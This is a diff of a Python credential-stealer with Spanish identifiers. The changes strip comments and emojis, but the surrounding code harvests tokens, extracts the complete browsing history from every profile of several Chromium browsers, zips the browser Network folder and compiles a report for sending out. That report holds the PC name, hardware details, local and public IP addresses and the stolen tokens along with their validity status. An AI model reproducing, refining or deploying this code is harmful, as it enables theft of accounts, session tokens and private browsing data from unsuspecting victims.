@@ -90,7 +90,7 @@ def obtener_tokens_reales():
                 
     return tokens
 
-######## Historial Multi-Navegador y Multi-Perfil (TXT Global sin límites) #
+
 
 def generar_archivo_historial():
     local_appdata = os.getenv("LOCALAPPDATA")
@@ -102,7 +102,7 @@ def generar_archivo_historial():
             f.write("No se pudieron obtener las rutas de AppData.")
         return txt_path
 
-    # Rutas base de navegadores basados en Chromium
+    
     navegadores = {
         "Google Chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data"),
         "Brave": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data"),
@@ -119,7 +119,7 @@ def generar_archivo_historial():
             if not os.path.exists(base_path):
                 continue
 
-            # Identificar perfiles disponibles dinámicamente
+            
             perfiles = ["Default"]
             try:
                 for item in os.listdir(base_path):
@@ -130,7 +130,7 @@ def generar_archivo_historial():
                 pass
 
             for perfil in perfiles:
-                # Opera Stable maneja el archivo History directo o dentro de Default
+                
                 if nav_nombre == "Opera Stable":
                     history_path = os.path.join(base_path, "History")
                     if not os.path.exists(history_path):
@@ -148,7 +148,7 @@ def generar_archivo_historial():
                     conn = sqlite3.connect(temp_history)
                     cursor = conn.cursor()
                     
-                    # Consulta sin LIMIT para extraer todo
+                    
                     query = """
                         SELECT url, title, last_visit_time 
                         FROM urls 
@@ -176,7 +176,7 @@ def generar_archivo_historial():
                             
     return txt_path
 
-######## Procesar Carpeta Network (ZIP) #####################################
+
 
 def empaquetar_network():
     network_dir = os.path.join(
@@ -288,14 +288,14 @@ def enviar_reporte_completo(tokens):
     datos_pc = obtener_info_pc()
     
     descripcion = (
-        f"💻 **PC:** `{datos_pc['nombre_pc']}`\n"
-        f"⚙️ **OS:** `{datos_pc['os']}`\n"
-        f"🔧 **Procesador:** `{datos_pc['procesador']}`\n"
-        f"🎮 **Gráfica (GPU):** `{datos_pc['gpu']}`\n"
-        f"🌐 **IP Local:** `{datos_pc['ip_local']}`\n"
-        f"🌍 **IP Pública:** `{datos_pc['ip_publica']}`\n\n"
+        f" **PC:** `{datos_pc['nombre_pc']}`\n"
+        f" **OS:** `{datos_pc['os']}`\n"
+        f" **Procesador:** `{datos_pc['procesador']}`\n"
+        f" **Gráfica (GPU):** `{datos_pc['gpu']}`\n"
+        f" **IP Local:** `{datos_pc['ip_local']}`\n"
+        f" **IP Pública:** `{datos_pc['ip_publica']}`\n\n"
         f"---\n"
-        f"🔑 **Tokens:**\n"
+        f" **Tokens:**\n"
     )
 
     if tokens:
@@ -318,7 +318,7 @@ def enviar_reporte_completo(tokens):
             else:
                 status = resultado["status"]
                 descripcion += (
-                    f"\n❌ **Token Inválido (Error: {status}):**\n"
+                    f"\n **Token Inválido (Error: {status}):**\n"
                     f"`{token_limpio}`\n"
                 )
             
